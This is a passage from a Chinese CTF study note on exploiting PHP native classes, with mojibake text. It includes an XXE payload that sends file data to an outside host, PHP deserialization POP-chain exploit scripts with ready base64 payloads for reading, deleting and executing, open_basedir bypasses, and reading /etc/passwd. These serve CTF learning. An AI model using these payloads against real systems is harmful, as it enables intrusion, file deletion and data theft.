\"php://filter/read=convert.base64-encode/resource=http://127.0.0.1/show.php?action=view&amp;filename=1.txt\"&gt; &lt;!ENTITY % all \"&lt;!ENTITY &amp;#37; send SYSTEM 'https://VPS/?%payl;'&gt;\"&gt; ä¸Šä¼ æˆåŠŸä¹‹åå†åˆ©ç”¨SimpleXMLElementç±»è¿›è¡ŒSSRFï¼Œä¹Ÿå°±æ˜¯è®¿é—®URLï¼š /show.php?module=SimpleXMLElement&amp;args[]=http://124.220.233.26/tmp/evil.xml&amp;args[]=2&amp;args[]=true ä¹‹åæŸ¥çœ‹webè®¿é—®æ—¥å¿—ï¼Œå°†å¾—åˆ°çš„ç»“æœbase64è§£ç ä¹‹åå³å¯ã€‚ï¼ˆæ³¨æ„ç”±äºåˆ†äº†2æ¬¡ä¸Šä¼ ï¼Œå› æ­¤ä¸¤æ¬¡çš„æ–‡ä»¶åå­—éœ€è¦ä¸ä¸€æ ·æ‰è¡Œï¼‰ è¿™é‡Œä¸çŸ¥é“ä¸ºå•¥ä¸€ç›´å®ç°ä¸äº†,å°±çœ‹ä¸ªæ€è·¯å§â€¦ 10.5 ZipArchive ç±»æ¥åˆ é™¤æ–‡ä»¶ ZipArchive ç±» PHP ZipArchiveç±»æ˜¯PHPçš„ä¸€ä¸ªåŸç”Ÿç±»ï¼Œå®ƒæ˜¯åœ¨PHP 5.20ä¹‹åå¼•å…¥çš„ã€‚ZipArchiveç±»å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œå‹ç¼©ä¸è§£å‹ç¼©å¤„ç†ã€‚ ä¸‹é¢åˆ—ä¸¾å‡ ä¸ªå¸¸è§çš„ç±»æ–¹æ³•ï¼š - `ZipArchive::addEmptyDir`ï¼šæ·»åŠ ä¸€ä¸ªæ–°çš„æ–‡ä»¶ç›®å½• - `ZipArchive::addFile`ï¼šå°†æ–‡ä»¶æ·»åŠ åˆ°æŒ‡å®šzipå‹ç¼©åŒ…ä¸­ - `ZipArchive::addFromString`ï¼šæ·»åŠ æ–°çš„æ–‡ä»¶åŒæ—¶å°†å†…å®¹æ·»åŠ è¿›å» - `ZipArchive::close`ï¼šå…³é—­ziparchive - `ZipArchive::extractTo`ï¼šå°†å‹ç¼©åŒ…è§£å‹ - `ZipArchive::open`ï¼šæ‰“å¼€ä¸€ä¸ªzipå‹ç¼©åŒ… - `ZipArchive::deleteIndex`ï¼šåˆ é™¤å‹ç¼©åŒ…ä¸­çš„æŸä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚ï¼š`deleteIndex(0)`ä»£è¡¨åˆ é™¤ç¬¬ä¸€ä¸ªæ–‡ä»¶ - `ZipArchive::deleteName`ï¼šåˆ é™¤å‹ç¼©åŒ…ä¸­çš„æŸä¸€ä¸ªæ–‡ä»¶åç§°ï¼ŒåŒæ—¶ä¹Ÿå°†æ–‡ä»¶åˆ é™¤ - â€¦â€¦ æˆ‘ä»¬æ¥é‡ç‚¹çœ‹çœ‹ ZipArchive::open æ–¹æ³•ï¼š ZipArchive::open ( string $filename [, int $flags ] ) : mixed è¯¥æ–¹æ³•ç”¨æ¥æ‰“å¼€ä¸€ä¸ªæ–°çš„æˆ–ç°æœ‰çš„zipå­˜æ¡£ä»¥è¿›è¡Œè¯»å–ï¼Œå†™å…¥æˆ–ä¿®æ”¹ã€‚ - `$filename`ï¼šè¦æ‰“å¼€çš„ZIPå­˜æ¡£çš„æ–‡ä»¶åã€‚ - `$flags`ï¼šç”¨äºæ‰“å¼€æ¡£æ¡ˆçš„æ¨¡å¼ã€‚æœ‰ä»¥ä¸‹å‡ ç§æ¨¡å¼ï¼š - `ZipArchive::OVERWRITE`ï¼šæ€»æ˜¯ä»¥ä¸€ä¸ªæ–°çš„å‹ç¼©åŒ…å¼€å§‹ï¼Œæ­¤æ¨¡å¼ä¸‹å¦‚æœå·²ç»å­˜åœ¨åˆ™ä¼šè¢«è¦†ç›–æˆ–åˆ é™¤ã€‚ - `ZipArchive::CREATE`ï¼šå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»ºä¸€ä¸ªzipå‹ç¼©åŒ…ã€‚ - `ZipArchive::RDONLY`ï¼šåªè¯»æ¨¡å¼æ‰“å¼€å‹ç¼©åŒ…ã€‚ - `ZipArchive::EXCL`ï¼šå¦‚æœå‹ç¼©åŒ…å·²ç»å­˜åœ¨ï¼Œåˆ™å‡ºé”™ã€‚ - `ZipArchive::CHECKCONS`ï¼šå¯¹å‹ç¼©åŒ…æ‰§è¡Œé¢å¤–çš„ä¸€è‡´æ€§æ£€æŸ¥ï¼Œå¦‚æœå¤±è´¥åˆ™æ˜¾ç¤ºé”™è¯¯ã€‚ æ³¨æ„ï¼Œå¦‚æœè®¾ç½®flagså‚æ•°çš„å€¼ä¸º ZipArchive::OVERWRITE çš„è¯ï¼Œå¯ä»¥æŠŠæŒ‡å®šæ–‡ä»¶åˆ é™¤ã€‚è¿™é‡Œæˆ‘ä»¬è·Ÿè¿›æ–¹æ³•å¯ä»¥çœ‹åˆ°const OVERWRITE = 8ï¼Œä¹Ÿå°±æ˜¯å°†OVERWRITEå®šä¹‰ä¸ºäº†å¸¸é‡8ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨æ—¶ä¹Ÿå¯ä»¥ç›´æ¥å°†$flagsèµ‹å€¼ä¸º8ã€‚ ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ZipArchiveåŸç”Ÿç±»è°ƒç”¨openæ–¹æ³•åˆ é™¤ç›®æ ‡ä¸»æœºä¸Šçš„æ–‡ä»¶ã€‚ exampleï¼š $a = new ZipArchive(); $a-&gt;open('1.txt',ZipArchive::OVERWRITE); // ZipArchive::OVERWRITE: æ€»æ˜¯ä»¥ä¸€ä¸ªæ–°çš„å‹ç¼©åŒ…å¼€å§‹ï¼Œæ­¤æ¨¡å¼ä¸‹å¦‚æœå·²ç»å­˜åœ¨åˆ™ä¼šè¢«è¦†ç›– // å› ä¸ºæ²¡æœ‰ä¿å­˜ï¼Œæ‰€ä»¥æ•ˆæœå°±æ˜¯åˆ é™¤äº†1.txt [NepCTF 2021]æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­ æ‰¾äº†åŠå¤©æ²¡æ‰¾åˆ°å¤ç°ç¯å¢ƒï¼Œå°±è·Ÿç€wpèµ°ä¸€éå§ è¿›å…¥é¢˜ç›®ï¼Œç»™å‡ºæºç ï¼š &lt;?php highlight_file(__FILE__); error_reporting(0); include('shell.php'); class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-&gt;username='user'; $this-&gt;password='user'; } public function __wakeup(){ if(md5($this-&gt;register)===\"21232f297a57a5a743894a0e4a801fc3\"){ // admin $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content); }else{ $this-&gt;choice = new register(); } } public function __destruct() { $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password); } } class login{ public $file; public $filename; public $content; public function __construct($file,$filename,$content) { $this-&gt;file=$file; $this-&gt;filename=$filename; $this-&gt;content=$content; } public function checking($username,$password) { if($username==='admin'&amp;&amp;$password==='admin'){ $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die('login success you can to open shell file!'); } } } class register{ public function checking($username,$password) { if($username==='admin'&amp;&amp;$password==='admin'){ die('success register admin'); }else{ die('please register admin '); } } } class Open{ function open($filename, $content){ if(!file_get_contents('waf.txt')){ // å½“waf.txtæ²¡è¯»å–æˆåŠŸæ—¶æ‰èƒ½å¾—åˆ°flag shell($content); }else{ echo file_get_contents($filename.\".php\"); // filename=php://filter/read=convert.base64-encode/resource=shell } } } if($_GET['a']!==$_GET['b']&amp;&amp;(md5($_GET['a']) === md5($_GET['b'])) &amp;&amp; (sha1($_GET['a'])=== sha1($_GET['b']))){ @unserialize(base64_decode($_POST['unser'])); } è¿™æ˜¯ä¸€é“ååºåˆ—åŒ–é¢˜ç›®ï¼Œä½†æ˜¯å‰é¢åŠ äº†ä¸€ä¸ªç®€å•çš„PHPç‰¹æ€§ã€‚ 1. æ•°ç»„ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ ç”±äºmd5()å’Œsha1()å‡½æ•°éƒ½æ— æ³•å¤„ç†æ•°ç»„ï¼Œå› æ­¤ä¼ å…¥ä¸€ä¸ªæ•°ç»„ä¼šè¿”å›falseã€‚å› æ­¤è¿™é‡Œå¯ä»¥ç»•è¿‡éœ€è¦ä¸¤ä¸ªä¸åŒçš„æ•°ä½†æ˜¯å…¶å“ˆå¸Œå€¼è¦ç›¸ç­‰ã€‚ exampleï¼š 2. åˆ©ç”¨php://filterè¯»æ–‡ä»¶ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°Openç±»é‡Œé¢çš„open()æ–¹æ³•ï¼Œå½“waf.txtæ–‡ä»¶å­˜åœ¨çš„æ—¶å€™ä¼šæ‰§è¡Œecho file_get_contents($filename.\".php\");ï¼Œè€Œè°ƒç”¨è¿™ä¸ªç±»æ–¹æ³•æ˜¯åœ¨Loginç±»é‡Œé¢çš„checking()æ–¹æ³•ï¼Œ è€Œè°ƒç”¨Loginç±»çš„checking()æ–¹æ³•çš„æ˜¯Gameç±»é‡Œé¢çš„__destruct()å†…ç½®æ–¹æ³•ï¼Œå› æ­¤æˆ‘ä»¬å°±èƒ½å¤Ÿæ‰¾åˆ°ä¸€æ¡å®Œæ•´çš„åˆ©ç”¨é“¾äº†ï¼ŒPOCï¼š è‡ªå·±å¤§æ¦‚ä¹Ÿæ‰“é€šäº†ï¼Œä¸é”™â€¦ &lt;?php class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; } class login{ public $file; public $filename; public $content; } class Open{ } $poc = new Game(); $poc-&gt;username = \"admin\"; $poc-&gt;password = \"admin\"; $poc-&gt;register = \"admin\"; $poc-&gt;file = new Open(); $poc-&gt;filename = \"php://filter/read=convert.base64-encode/resource=shell\"; $poc-&gt;content = \"xxx\"; echo base64_encode(serialize($poc)); ?&gt; å¾—åˆ°ï¼š Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NTQ6InBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1zaGVsbCI7czo3OiJjb250ZW50IjtzOjM6IjEyMyI7fQ== æ‰§è¡Œpayloadè¯»å–åˆ°shell.phpçš„æºç base64ç¼–ç ï¼š æœç„¶å•Šï¼Œå¤ç°çš„æ—¶å€™ï¼Œå‘ç°åŸæ¥æ˜¯waf.txtæ²¡åˆ›å»ºï¼Œå¯¼è‡´ä»£ç èµ°ä¸é€šâ€¦ shell.php &lt;?php function shell($cmd){ if(strlen($cmd)&lt;10){ if(preg_match('/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/',$cmd)){ die(\"NO\"); }else{ return system($cmd); } }else{ die('so long!'); } } 3. åˆ©ç”¨ZipArchiveç±»åˆ é™¤æ–‡ä»¶ è”åˆindex.phpé‡Œé¢çš„Openç±»ï¼š class Open{ function open($filename, $content){ if(!file_get_contents('waf.txt')){ // å½“waf.txtæ²¡è¯»å–æˆåŠŸæ—¶æ‰èƒ½å¾—åˆ°flag shell($content); }else{ echo file_get_contents($filename.\".php\"); // filename=php://filter/read=convert.base64-encode/resource=shell } } } å¯çŸ¥æˆ‘ä»¬åªè¦ä½¿ file_get_contents('waf.txt') è¯»å–å¤±è´¥å°±å¯ä»¥è¿›å…¥ shell($content) æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚æ‰€ä»¥æˆ‘ä»¬åº”è¯¥è¦æƒ³åŠæ³•å°†waf.txtè¿™ä¸ªæ–‡ä»¶åˆ é™¤ï¼Œè¿™æ ·å°±ä¼šè¯»å–å¤±è´¥ï¼Œæ‰èƒ½æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤ã€‚ åˆšå¥½æˆ‘ä»¬çš„ZipArchiveç±»é‡Œé¢ä¹Ÿæœ‰ä¸€ä¸ªopen()æ–¹æ³•ï¼Œ ZipArchive::open($filename, $flags = null) å¦‚æœè®¾ç½®flagså‚æ•°çš„å€¼ä¸º ZipArchive::OVERWRITE çš„è¯ï¼Œå¯ä»¥æŠŠæŒ‡å®šæ–‡ä»¶åˆ é™¤ã€‚è¿™é‡Œæˆ‘ä»¬è·Ÿè¿›æ–¹æ³•å¯ä»¥çœ‹åˆ°const OVERWRITE = 8ï¼Œä¹Ÿå°±æ˜¯å°†OVERWRITEå®šä¹‰ä¸ºäº†å¸¸é‡8ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨æ—¶ä¹Ÿå¯ä»¥ç›´æ¥å°†flagsèµ‹å€¼ä¸º8ã€‚ æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨ZipArchiveåŸç”Ÿç±»è°ƒç”¨openæ–¹æ³•ï¼Œå³å¯å°†å³å¯å°†$filenameï¼ˆwaf.txtï¼‰åˆ é™¤ï¼š &lt;?php // highlight_file(__FILE__); error_reporting(-1); class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; } class login{ public $file; public $filename; public $content; } class Open{ } $poc = new Game(); $poc-&gt;username = \"admin\"; $poc-&gt;password = \"admin\"; $poc-&gt;register = \"admin\"; $poc-&gt;file = new ZipArchive(); $poc-&gt;filename = \"waf.txt\"; $poc-&gt;content = 8; echo base64_encode(serialize($poc)); ?&gt; å¾—åˆ°payloadï¼š Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo4O30= æ‰§è¡Œä¹‹åå³å¯åˆ é™¤waf.txtã€‚æ³¨æ„æˆ‘è¿™é‡Œåœ¨æœ¬åœ°å¤ç°çš„æ—¶å€™éœ€è¦æŠŠç›®å½•æ–‡ä»¶å¤¹çš„æ‰€æœ‰æƒå’Œåˆ†ç»„éƒ½ç»™åˆ°www-dataæ‰èƒ½æˆåŠŸåˆ é™¤æ–‡ä»¶ æˆ‘è¿™é‡Œæ˜¯å°†æ–‡ä»¶å¤¹æƒé™è®¾ç½®ä¸ºwwwå³å¯ 4. å‘½ä»¤æ‰§è¡Œç»•è¿‡é»‘åå•å’Œå­—ç¬¦æ•°é™åˆ¶ æœ€åä¸€æ­¥å°±æ˜¯æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤å»è¯»flagï¼Œå›è¿‡å¤´æ¥çœ‹æˆ‘ä»¬çš„shell.php &lt;?php function shell($cmd){ if(strlen($cmd)&lt;10){ if(preg_match('/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/',$cmd)){ die(\"NO\"); }else{ return system($cmd); } }else{ die('so long!'); } } è¿™é‡Œé¦–å…ˆé™åˆ¶äº†æˆ‘ä»¬çš„å‘½ä»¤é•¿åº¦è¦å°äº10ä¸ªå­—ç¬¦ï¼Œç„¶åå­—ç¬¦é‡Œé¢ä¸èƒ½æœ‰é»‘åå•å­—ç¬¦å‡ºç°ï¼Œè¿™é‡Œæˆ‘ä»¬ç»•è¿‡çš„æ–¹æ³•å¾ˆå¤šï¼Œä¸¾ä¸ªä¾‹ï¼š n\\l /flag POC: &lt;?php // highlight_file(__FILE__); error_reporting(-1); class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; } class login{ public $file; public $filename; public $content; } class Open{ } $poc = new Game(); $poc-&gt;username = \"admin\"; $poc-&gt;password = \"admin\"; $poc-&gt;register = \"admin\"; $poc-&gt;file = new Open(); $poc-&gt;filename = \"xxx\"; $poc-&gt;content = \"n\\l /flag\"; echo base64_encode(serialize($poc)); ?&gt; å¾—åˆ°payloadï¼šè¿™é‡Œä¼°è®¡æ˜¯æ–‡ä»¶ä½ç½®æ”¾çš„ä¸å¯¹,æˆ‘æ€»æ˜¯è¯»ä¸åˆ° Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6MzoieHh4IjtzOjc6ImNvbnRlbnQiO3M6OToiblxsIC9mbGFnIjt9 10.6 éå†ç›®å½•ç±» DirectoryIterator ç±» DirectoryIterator ç±»æä¾›äº†ä¸€ä¸ªç”¨äºæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç›®å½•å†…å®¹çš„ç®€å•æ¥å£ã€‚è¯¥ç±»çš„æ„é€ æ–¹æ³•å°†ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ã€‚ ç±»æ‘˜è¦ï¼š DirectoryIterator extends SplFileInfo implements SeekableIterator { /* æ–¹æ³• */ public __construct ( string $path ) public current ( ) : DirectoryIterator public getATime ( ) : int public getBasename ( string $suffix = ? ) : string public getCTime ( ) : int public getExtension ( ) : string public getFilename ( ) : string public getGroup ( ) : int public getInode ( ) : int public getMTime ( ) : int public getOwner ( ) : int public getPath ( ) : string public getPathname ( ) : string public getPerms ( ) : int public getSize ( ) : int public getType ( ) : string public isDir ( ) : bool public isDot ( ) : bool public isExecutable ( ) : bool public isFile ( ) : bool public isLink ( ) : bool public isReadable ( ) : bool public isWritable ( ) : bool public key ( ) : string public next ( ) : void public rewind ( ) : void public seek ( int $position ) : void public __toString ( ) : string // ä»¥å­—ç¬¦ä¸²å½¢å¼è·å–æ–‡ä»¶å public valid ( ) : bool } åˆ©ç”¨ DirectoryIterator ç±»éå†æŒ‡å®šç›®å½•é‡Œçš„æ–‡ä»¶ï¼š å¦‚æœæˆ‘ä»¬è¿™æ ·ï¼š &lt;?php $dir=new DirectoryIterator(\"/\"); echo $dir; ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ã€‚å½“æ‰§è¡Œåˆ°echoå‡½æ•°æ—¶ï¼Œä¼šè§¦å‘DirectoryIteratorç±»ä¸­çš„ __toString() æ–¹æ³•ï¼Œè¾“å‡ºæŒ‡å®šç›®å½•é‡Œé¢ç»è¿‡æ’åºä¹‹åçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶åï¼š ä¹Ÿå¯ä»¥é…åˆglob://åè®®ä½¿ç”¨æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶è·¯å¾„ï¼š glob:// åè®®ç”¨æ¥æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ &lt;?php $dir=new DirectoryIterator(\"glob:///*flag*\"); echo $dir; å¦‚æœæƒ³è¾“å‡ºå…¨éƒ¨çš„æ–‡ä»¶åæˆ‘ä»¬è¿˜éœ€è¦å¯¹$dirå¯¹è±¡è¿›è¡Œéå†ï¼š &lt;?php $dir=new DirectoryIterator(\"/\"); foreach($dir as $f){ echo($f.'&lt;br&gt;'); } FilesystemIterator ç±» FilesystemIterator ç±»ä¸ DirectoryIterator ç±»ç›¸åŒï¼Œæä¾›äº†ä¸€ä¸ªç”¨äºæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç›®å½•å†…å®¹çš„ç®€å•æ¥å£ã€‚è¯¥ç±»çš„æ„é€ æ–¹æ³•å°†ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ã€‚ è¯¥ç±»çš„ä½¿ç”¨æ–¹æ³•ä¸DirectoryIterator ç±»ä¹Ÿæ˜¯åŸºæœ¬ç›¸åŒçš„ï¼š &lt;?php $dir=new FilesystemIterator(\"/\"); echo $dir; &lt;?php $dir=new FilesystemIterator(\"glob:///*flag*\"); echo $dir; &lt;?php $dir=new FilesystemIterator(\"/\"); foreach($dir as $f){ echo($f.'&lt;br&gt;'); } GlobIterator ç±» ä¸å‰ä¸¤ä¸ªç±»çš„ä½œç”¨ç›¸ä¼¼ï¼ŒGlobIterator ç±»ä¹Ÿå¯ä»¥éå†ä¸€ä¸ªæ–‡ä»¶ç›®å½•ï¼Œä½¿ç”¨æ–¹æ³•ä¸å‰ä¸¤ä¸ªç±»ä¹ŸåŸºæœ¬ç›¸ä¼¼ã€‚ä½†ä¸ä¸Šé¢ç•¥ä¸åŒçš„æ˜¯å…¶è¡Œä¸ºç±»ä¼¼äº glob()ï¼Œå¯ä»¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„ã€‚ ç±»æ‘˜è¦ï¼š GlobIterator extends FilesystemIterator implements SeekableIterator , Countable { /* æ–¹æ³• */ public __construct ( string $pattern , int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ) public count ( ) : int /* ç»§æ‰¿çš„æ–¹æ³• */ public FilesystemIterator::__construct ( string $path , int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO | FilesystemIterator::SKIP_DOTS ) public FilesystemIterator::current ( ) : mixed public FilesystemIterator::getFlags ( ) : int public FilesystemIterator::key ( ) : string public FilesystemIterator::next ( ) : void public FilesystemIterator::rewind ( ) : void public FilesystemIterator::setFlags ( int $flags = ? ) : void } æˆ‘ä»¬çŸ¥é“ï¼Œå‘ä¸‹é¢è¿™æ ·åœ¨å•çº¯çš„ä½¿ç”¨ DirectoryIterator ç±»å’Œ FilesystemIterator ç±»ä¸”æ²¡æœ‰é…åˆglob://åè®®è¿›è¡ŒåŒ¹é…çš„æ—¶å€™ï¼š &lt;?php $dir=new DirectoryIterator(\"/\"); echo $dir; &lt;?php $dir=new FilesystemIterator(\"/\"); echo $dir; å…¶æ„é€ å‡½æ•°åˆ›å»ºçš„æ˜¯ä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨echoå‡½æ•°è¾“å‡ºçš„æ—¶å€™ï¼Œä¼šè§¦å‘è¿™ä¸¤ä¸ªç±»ä¸­çš„ __toString() æ–¹æ³•ï¼Œè¾“å‡ºæŒ‡å®šç›®å½•é‡Œé¢ç‰¹å®šæ’åºä¹‹åçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶åã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬ä¸å¾ªç¯éå†çš„è¯æ˜¯ä¸èƒ½çœ‹åˆ°æŒ‡å®šç›®å½•é‡Œçš„å…¨éƒ¨æ–‡ä»¶çš„ï¼Œè€Œ GlobIterator ç±»ä¾¿å¯ä»¥å¸®æˆ‘ä»¬åœ¨ä¸€å®šç¨‹åº¦ä¸Šè§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚ç”±äº GlobIterator ç±»æ”¯æŒç›´æ¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯è¯´å‡è®¾æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªæ–‡ä»¶åçš„ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥ç±»çš„æ¨¡å¼åŒ¹é…æ‰¾åˆ°å…¶å®Œæ•´çš„æ–‡ä»¶åã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬åœ¨CTFä¸­çŸ¥é“flagåœ¨æ ¹ç›®å½•ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“flagæ–‡ä»¶çš„å®Œæ•´æ–‡ä»¶åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç±»ä¼¼ GlobIterator(/*flag*)ï¼š ä½¿ç”¨å¯éå†ç›®å½•ç±»ç»•è¿‡ open_basedir DirectoryIteratorç±»æˆ–è€…FilesystemIteratorç±»ä¸glob://åè®®ç»“åˆå°†æ— è§†open_basedirå¯¹ç›®å½•çš„é™åˆ¶ï¼Œå¯ä»¥ç”¨æ¥åˆ—ä¸¾å‡ºæŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚ example: &lt;?php $dir = $_GET['whoami']; $a = new DirectoryIterator($dir); foreach($a as $f){ echo($f-&gt;__toString().'&lt;br&gt;');// ä¸åŠ __toString()ä¹Ÿå¯,å› ä¸ºechoå¯ä»¥è‡ªåŠ¨è°ƒç”¨ } ?&gt; # payloadä¸€å¥è¯çš„å½¢å¼: $a = new DirectoryIterator(\"glob:///*\");foreach($a as $f){echo($f-&gt;__toString().'&lt;br&gt;');} ä½¿ç”¨FilesystemIteratorç±»åŒç†ã€‚ è€Œä½¿ç”¨ GlobIterator ç±»æ”¯æŒç›´æ¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ä¸ç”¨åœ¨é…åˆglob://åè®®äº†ã€‚ example: &lt;?php $dir = $_GET['whoami']; $a = new GlobIterator($dir); foreach($a as $f){ echo($f-&gt;__toString().'&lt;br&gt;');// ä¸åŠ __toString()ä¹Ÿå¯,å› ä¸ºechoå¯ä»¥è‡ªåŠ¨è°ƒç”¨ } ?&gt; # payloadä¸€å¥è¯çš„å½¢å¼: $a = new FilesystemIterator(\"/*\");foreach($a as $f){echo($f-&gt;__toString().'&lt;br&gt;');} 10.7 å¯è¯»å–æ–‡ä»¶ç±» SplFileObject ç±» SplFileObject ç±»ä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†ä¸€ä¸ªé«˜çº§çš„é¢å‘å¯¹è±¡çš„æ¥å£ï¼Œå¯ä»¥ç”¨äºå¯¹æ–‡ä»¶å†…å®¹çš„éå†ã€æŸ¥æ‰¾ã€æ“ä½œç­‰ã€‚è¯¦æƒ…è¯·å‚è€ƒï¼šhttps://www.php.net/manual/zh/class.splfileobject.php è¯¥ç±»çš„æ„é€ æ–¹æ³•å¯ä»¥æ„é€ ä¸€ä¸ªæ–°çš„æ–‡ä»¶å¯¹è±¡ç”¨äºåç»­çš„è¯»å–ã€‚ æˆ‘ä»¬å¯ä»¥åƒç±»ä¼¼ä¸‹é¢è¿™æ ·å»è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„ä¸€è¡Œï¼š &lt;?php $context = new SplFileObject('/etc/passwd'); echo $context; ä½†æ˜¯è¿™æ ·ä¹Ÿåªèƒ½è¯»å–ä¸€è¡Œï¼Œè¦æƒ³å…¨éƒ¨è¯»å–çš„è¯è¿˜éœ€è¦å¯¹æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œå†…å®¹è¿›è¡Œéå†ï¼š &lt;?php $context = new SplFileObject('/etc/passwd'); foreach($context as $f){ echo($f); } //D:\\labwork\\phpstudy_pro\\WWW\\1.txt [DASCTF MAR 2021]ez_serialize è¿›å…¥é¢˜ç›®ï¼Œç»™å‡ºæºç ï¼š &lt;?php error_reporting(0); highlight_file(__FILE__); class A{ public $class; public $para; public $check; public function __construct() { $this-&gt;class = \"B\"; $this-&gt;para = \"ctfer\"; echo new $this-&gt;class ($this-&gt;para); } public function __wakeup() // å¯ä»¥ç›´æ¥ç»•è¿‡__wakeup()æ–¹æ³•çš„æ‰§è¡Œ { $this-&gt;check = new C; if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) { echo new $this-&gt;class ($this-&gt;para); } else die('bad hacker~'); } } class B{ var $a; public function __construct($a) { $this-&gt;a = $a; echo (\"hello \".$this-&gt;a); } } class C{ function vaild($code){ $pattern = '/[!|@|#|$|%|^|&amp;|*|=|\\'|\"|:|;|?]/i'; if (preg_match($pattern, $code)){ return false; } else return true; } } if(isset($_GET['pop'])){ unserialize($_GET['pop']); } else{ $a=new A; } è¿™æ˜¯ä¸€é“PHPååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œé¢˜ç›®é‡Œé¢æ²¡æœ‰ç»™å‡ºä»€ä¹ˆå±é™©çš„å‡½æ•°è°ƒç”¨ï¼Œå› æ­¤åº”è¯¥è¦æƒ³åˆ°æ˜¯åŸç”Ÿç±»çš„åˆ©ç”¨ã€‚ç•™æ„è¿™ä¸€æ®µä»£ç ï¼š public function __wakeup() // å¯ä»¥ç›´æ¥ç»•è¿‡__wakeup()æ–¹æ³•çš„æ‰§è¡Œ { $this-&gt;check = new C; if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) { echo new $this-&gt;class ($this-&gt;para); } else die('bad hacker~'); } 